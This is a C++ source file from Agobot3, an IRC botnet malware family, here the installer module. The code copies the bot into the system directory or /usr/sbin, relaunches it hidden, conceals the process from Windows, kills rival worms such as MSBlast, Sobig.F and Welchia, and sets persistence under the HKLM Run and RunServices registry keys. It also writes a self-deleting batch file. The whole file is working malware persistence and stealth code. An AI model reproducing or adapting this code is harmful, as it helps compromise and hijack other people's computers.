/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "installer.h"
#include "mainctrl.h"

#ifdef WIN32
RSP fRegisterServiceProcess;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;

HANDLE psnap;
PROCESSENTRY32 pe32;
#endif // WIN32

int GetCopies(CString &sFilename)
{
#ifdef WIN32
	char cFilename[MAX_PATH]; GetModuleFileName(GetModuleHandle(NULL), cFilename, sizeof(cFilename));
	if(fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next)
	{	psnap=fCreateToolhelp32Snapshot(2, 0);
		if(psnap!=INVALID_HANDLE_VALUE)
		{	int copies=0; pe32.dwSize=sizeof(PROCESSENTRY32);
			if(fProcess32First(psnap, &pe32))
			{	do {	if((strncmp(cFilename+(strlen(cFilename)-strlen(pe32.szExeFile)), \
						pe32.szExeFile, strlen(pe32.szExeFile))==0) || \
						(strncmp(sFilename, pe32.szExeFile, strlen(pe32.szExeFile))==0))
							copies++;
				} while(fProcess32Next(psnap, &pe32)); }
			CloseHandle(psnap);
			return copies; }
		else return 0; }
	else return 0;
#else
	char szCmdBuf[4096]; sprintf(szCmdBuf, "ps ax | grep %s | grep -v grep > psaxtemp", sFilename.CStr());
	system(szCmdBuf); FILE *fp=fopen("psaxtemp", "r"); if(!fp) return 0;
	fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
	if(lFileSize>0) return 1;
	fclose(fp); system("rm -f psaxtemp"); return 0;
#endif // WIN32
}

bool CInstaller::CopyToSysDir(CString &sFilename)
{
	char tstr[MAX_PATH];
#ifdef WIN32
	CString sysdir; GetSystemDirectory(sysdir.GetBuffer(MAX_PATH), MAX_PATH);
	m_sSysDir.Assign(sysdir.CStr());
	CString cfilename; GetModuleFileName(GetModuleHandle(NULL), cfilename.GetBuffer(MAX_PATH), MAX_PATH);

	HINSTANCE kernel32_dll=LoadLibrary("kernel32.dll");
	if(kernel32_dll)
	{	fRegisterServiceProcess=(RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot=(CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First=(P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next=(P32N)GetProcAddress(kernel32_dll, "Process32Next");
		if(fRegisterServiceProcess) fRegisterServiceProcess(0, 1); }
#else
	m_sSysDir.Assign("/usr/sbin");
	CString sysdir(m_sSysDir);
	CString cfilename(g_cMainCtrl.m_sArgv0);
#endif // WIN32

	if(!g_cMainCtrl.m_cCmdLine.m_cConfig.bUpdate)
	{
		unsigned long lStartTime=GetTickCount(); bool bFound=true;
		while((GetTickCount()-lStartTime) < 60000 && bFound)
		{	if(GetCopies(sFilename)<2) bFound=false; Sleep(1000);
		}
		if(bFound) exit(1);
	}

	long lTimeoutStart;

	if(!cfilename.Find(sFilename.CStr(), 0))
		if(g_cMainCtrl.m_cCmdLine.m_cConfig.bUpdate)
			KillProcess(sFilename.CStr());

#ifdef WIN32
	// Kill MSBlast
	KillProcess("msblast.exe");
	KillProcess("penis32.exe");
	KillProcess("mspatch.exe");

	// Kill Sobig.F
	KillProcess("winppr32.exe");

	// Kill Welchia
	KillProcess("dllhost.exe");
	KillProcess("tftpd.exe");
#else
	// FIXME: Add linux worm killer here
#endif // WIN32

	if(!cfilename.Find(sysdir, 0) || cfilename.Find("winhlpp32.exe", 0))
#ifdef LINUX
	if(!cfilename.Find(sFilename, 0))
#endif
	{	sprintf(tstr, "%s%c%s", sysdir.CStr(), DIRCHAR, sFilename.CStr());
		lTimeoutStart=GetTickCount();
	// FIXME::BAD!!!
#ifdef WIN32
		while(CopyFile(cfilename, tstr, false)==false &&
			GetTickCount()-lTimeoutStart < 25000) Sleep(2000);
#else
		char szCmdBuf[MAX_PATH]; sprintf(szCmdBuf, "cp %s %s", cfilename.CStr(), tstr);
		system(szCmdBuf);
#endif // WIN32

#ifndef _DEBUG

#ifdef WIN32
		PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo); sinfo.wShowWindow = SW_HIDE;
		if(CreateProcess(NULL, tstr, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) { exit(0); }
#else 
		sprintf(szCmdBuf, "%s 2>&1 > /dev/null 2>&1 &", tstr);
		system(szCmdBuf); exit(0);
#endif // WIN32

#endif // _DEBUG
	}
	return true;
}

bool CInstaller::Install()
{	return true; }

bool CInstaller::Uninstall()
{
#ifdef WIN32
	HANDLE f; DWORD r;
	PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
	char cmdline[MAX_PATH]; char tcmdline[MAX_PATH]; char cfilename[MAX_PATH];
	char batfile[MAX_PATH]; char tempdir[MAX_PATH];

	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
#else
	// Linux
#endif // WIN32
	return true;
}

#ifdef WIN32
bool CInstaller::RegStartAdd(CString &sValuename, CString &sFilename)
{	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename, 0, REG_SZ, (LPBYTE)(const char *)sFilename, (DWORD)strlen(sFilename)); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, sValuename, 0, REG_SZ, (LPBYTE)(const char *)sFilename, (DWORD)strlen(sFilename)); 
	RegCloseKey(key);

	return true; }

bool CInstaller::RegStartDel(CString &sValuename)
{	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename); 
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, sValuename); 
	RegCloseKey(key); 

	return true; }
#endif // WIN32
